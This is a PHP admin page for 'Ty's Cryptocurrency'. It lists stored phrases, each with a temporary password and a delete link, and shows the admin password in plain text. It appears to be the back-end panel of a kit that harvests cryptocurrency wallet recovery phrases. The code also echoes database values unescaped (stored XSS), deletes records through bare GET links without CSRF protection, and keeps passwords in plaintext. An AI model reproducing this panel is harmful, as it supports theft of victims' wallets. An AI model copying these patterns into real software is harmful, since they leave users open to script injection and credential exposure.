<?php

session_start();
if (isset($_SESSION['user'])) :?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="style.css">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous">

    <title>Ty's Cryptocurrency</title>
  </head>
  <body >
  <?php
  include("nav.php");
  include("Data.php");
  $phrases = new DataAccess();

  $getPhrases = $phrases->getPhrase();

  $get_Pass= $phrases->getPassword();

$sum = 0;
	

  ?>


  <table class="table table-dark table-hover table-bordered border-secondary table-striped">
  <thead>
    <tr>
    	<td scope="col">Serial Number</td>
      <td scope="col">Phrase</td>
      <td scope="col">Temporary Password</td>
      <td scope="col">Action</td>
      
    </tr>
  </thead>
  <tbody>
  	<?php
  
  	foreach ($getPhrases as $phras) {
  		
	$summ = $sum+=1;
	
  		echo "<tr>";
  		echo "<td>". $summ ."</td>";
	echo "<td>".$phras['Phrase']."</td>";
  echo "<td>".$phras['Password']."</td>";
	echo "<td>";
	echo "<a href=delete.php?Id=".$phras['Id'].">";
	echo "<input type='submit' name='' value='Delete'/>";
	echo "</a>";
	echo "</td>";
	echo "</tr>";
	}


  	?>
    
   
  </tbody>
</table>


<table class="table table-dark table-hover table-bordered border-secondary table-striped">
  <thead>
    <tr>
    	<td scope="col">Serial Number</td>
      <td scope="col">Admin Password</td>
      <td scope="col">Action</td>
      <td scope="col"></td>
      
    </tr>
  </thead>
  <tbody>
  	<?php
  
  	foreach ($get_Pass as $pass) {
  		
	
	
  		echo "<tr>";
  		echo "<td>1</td>";
	echo "<td>".$pass['Password']."</td>";
	echo "<td>";
	echo "<a href=edit_password.php?Id=".$pass['Id'].">";
	echo "<input type='submit' name='' value='Change Password'/>";
	echo "</a>";
	echo "</td>";
  echo "<td>";
  echo "<form action='logout.php' method='POST'>";
  echo "<input type='submit' class='btn btn-info' value='Log Out'/>";
  echo "</form>";
  echo "</td>";
	echo "</tr>";
	}


  	?>
    
   
  </tbody>
</table>


    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-p34f1UUtsS3wqzfto5wAAmdvj+osOnFyQFpp4Ua3gs/ZVWx6oOypYoCJhGGScy+8" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.min.js" integrity="sha384-lpyLfhYuitXl2zRZ5Bn2fqnhNAKOAaM/0Kr9laMspuaMiZfGmfwRNFh8HlMy49eQ" crossorigin="anonymous"></script>
    -->
  </body>
</html>

<?php
else:
header("location:admin.php");
endif;

?>